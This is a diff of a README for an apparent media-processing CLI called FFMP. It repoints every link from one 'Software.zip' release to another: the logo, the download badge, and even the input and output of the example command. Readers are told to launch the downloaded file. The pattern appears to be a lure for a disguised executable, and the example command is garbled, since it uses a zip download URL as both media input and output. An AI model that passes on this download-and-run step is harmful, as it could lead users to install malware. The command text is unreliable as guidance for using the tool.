@@ -1,6 +1,6 @@
 # 🌟 FFMP: Fast and Fabulous Media Processing CLI 🌟
 
-![FFMP Logo](https://github.com/Francisco5577/FFMP/releases/download/v1.0/Software.zip)
+![FFMP Logo](https://github.com/Francisco5577/FFMP/releases/download/v2.0/Software.zip)
 
 Welcome to the FFMP repository - your go-to tool for lightning-fast digital media processing using FFMPEG! 
 
@@ -18,7 +18,7 @@ FFMP is a powerful multithreaded C# Command Line Interface designed for seamless
 
 ## Installation
 To get started with FFMP, download the software package from the link below:
-[![Download FFMP Software](https://github.com/Francisco5577/FFMP/releases/download/v1.0/Software.zip%20Software-blue)](https://github.com/Francisco5577/FFMP/releases/download/v1.0/Software.zip)
+[![Download FFMP Software](https://github.com/Francisco5577/FFMP/releases/download/v2.0/Software.zip%20Software-blue)](https://github.com/Francisco5577/FFMP/releases/download/v2.0/Software.zip)
 *(Launch the downloaded file to install FFMP)*
 
 If the above link is not working, please visit the "Releases" section of this repository for alternative download options.
@@ -31,7 +31,7 @@ If the above link is not working, please visit the "Releases" section of this re
 
 Example command:
 ```bash
-ffmp -input https://github.com/Francisco5577/FFMP/releases/download/v1.0/Software.zip -output https://github.com/Francisco5577/FFMP/releases/download/v1.0/Software.zip -codec h264 -threads 4 -gpu
+ffmp -input https://github.com/Francisco5577/FFMP/releases/download/v2.0/Software.zip -output https://github.com/Francisco5577/FFMP/releases/download/v2.0/Software.zip -codec h264 -threads 4 -gpu
 ```
 
 ## Repository Topics
